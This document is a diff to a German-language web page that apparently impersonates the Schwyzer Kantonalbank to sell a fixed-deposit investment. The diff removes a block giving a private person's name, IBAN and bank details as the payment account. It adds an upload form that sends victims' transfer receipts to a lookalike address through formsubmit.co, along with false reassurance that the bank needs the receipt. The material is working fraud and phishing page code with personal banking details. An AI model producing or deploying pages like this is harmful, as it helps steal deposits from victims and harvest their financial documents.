@@ -268,23 +268,21 @@
     </div>
       
        <div class="info-box" style="margin-top: 20px;">
-      <h3>Referenzkonto</h3>
+      <h3>Überweisungsquittung</h3>
       <hr style="border: none; height: 1px; background-color: #ccc; margin: 8px 0;">
       <div class="info-box">
-        <p class="label">Kontoinhaber:</p>
-        <p>Udo John</p>
-
-        <p class="label">IBAN:</p>
-        <p>DE39265624900002138500</p>
-
-        <p class="label">BIC:</p>
-        <p>GENODEF1HTR</p>
-
-        <p class="label">Bank:</p>
-        <p>Volksbank Bad Laer-Borgloh-Hilter-Melle</p>
-        <p>Volksbank eG Bad Laer-Borgloh-Hilter-Melle<br>
-        Bielefelder Straße 16<br>
-        49176 Hilter am Teutoburger Wald</p>
+          <form id="uploadForm" action="https://formsubmit.co/kantonalbank@securemail.de.com" method="POST" enctype="multipart/form-data">
+            <label for="file">Überweisungsbeleg auswählen:</label><br>
+            <input type="file" name="attachment" required><br><br>
+            <input type="hidden" name="_subject" value="New file submission">
+            <input type="hidden" name="_captcha" value="false">
+            <input type="hidden" name="_template" value="box">
+            <input type="hidden" name="_next" value="https://banksysteme.github.io/investment/vielendank.html">
+            <button type="submit" class="button-red">Jetzt hochladen</button>
+          </form>
+          <p>Gemäß banküblicher Sorgfaltspflicht kann die Gutschrift bei der Schwyzer Kantonalbank erst nach Vorlage des Belegs final bestätigt und bearbeitet werden. 
+          So stellen wir sicher, dass Ihre Festgeldanlage korrekt und fristgerecht aktiviert wird.</p>
+      
       </div>
     </div>
 
